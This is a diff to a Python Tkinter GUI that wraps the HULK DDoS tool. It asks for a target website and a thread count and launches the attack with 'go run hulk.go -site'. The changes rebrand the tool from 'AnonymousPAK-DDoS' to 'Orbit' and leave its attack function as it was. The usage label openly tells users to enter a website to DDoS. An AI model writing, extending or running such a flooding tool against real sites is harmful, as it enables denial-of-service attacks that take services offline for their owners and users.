@@ -23,7 +23,7 @@ def Attack_Target():
         os.system('figlet AnonymousPAK DDoS')
     else:
         os.system("pyfiglet AnonymousPAK DDoS")
-    messagebox.showinfo("Attack Status", "HULK-DDoS Attack has been Started with " + str(threads) + " on Website " + website)
+    messagebox.showinfo("Orbit Status", "DDoS Attack has been Started with " + str(threads) + " on Website " + website)
     if str(platform.system()) == 'Windows':
         os.system('go run hulk.go -site {0}'.format(website))
     else:
@@ -35,9 +35,9 @@ def Attack_Target():
        
     
 root = tk.Tk()
-root.title("AnonymousPAK-DDoS Tool GUI")
+root.title("Orbit")
 
-Information = Label(text = "Anonymous-DDoS Tool", font = 'Calbri')
+Information = Label(text = "Orbit-DDoS Tool", font = 'Calbri')
 Information.grid(row =1, column =1)
 Usage = Label(text = 'Usage: Enter the Website to DDoS e.g. https://example.com and Number of Threads i.e. 1024 - Infinity (On Windows 1024 Threads are Limited)')
 Usage.grid(row =2, column =1)
